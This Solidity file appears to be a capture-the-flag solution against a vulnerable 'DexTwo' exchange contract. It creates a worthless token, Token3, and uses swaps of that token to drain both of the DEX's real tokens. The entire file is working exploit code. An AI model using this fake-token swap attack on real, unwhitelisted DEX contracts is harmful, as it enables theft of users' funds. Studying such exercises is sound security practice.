// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./DexTwo.sol";

contract Token3 is ERC20 {
    constructor() ERC20("Token3", "TKN3") {
        _mint(msg.sender, 100);
    }
}

contract Exploit {
    function yoink(DexTwo dex) public {
        dex.approve(address(dex), type(uint256).max);
        address token1 = dex.token1();
        address token2 = dex.token2();
        address token3 = address(new Token3());
        ERC20(token3).transfer(address(dex), 1);
        ERC20(token3).approve(address(dex), 1);
        dex.swap(token3, token1, 1);
        ERC20(token3).approve(address(dex), 2);
        dex.swap(token3, token2, 2);
    }
}
